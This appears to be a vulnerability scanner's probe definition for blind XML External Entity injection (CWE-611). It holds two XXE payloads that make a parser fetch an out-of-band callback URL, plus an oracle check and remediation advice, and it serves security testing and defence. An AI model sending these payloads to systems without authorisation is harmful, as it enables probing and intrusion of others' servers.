id: xxe-oob
name: XML External Entity (blind, OAST-confirmed)
family: xxe
severity: high
cwe: CWE-611
owasp: WSTG-INPV-07
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
inject_into: [body, json]
payloads:
  # {{oast_url}} carries a unique token in the path, so the entity fetch correlates to
  # this exact probe (works with both Interactsh and the self-hosted collector).
  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"{{oast_url}}\">]><r>&x;</r>"
  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"{{oast_url}}\"> %x;]><r/>"
oracle:
  type: any_of
  checks:
    - type: oob
confirm_reproducible: false
remediation: >-
  Disable external entity and DTD processing in the XML parser (set
  FEATURE_SECURE_PROCESSING, disallow-doctype-decl, and disable external
  general/parameter entities). Prefer a parser configured to reject DOCTYPE.
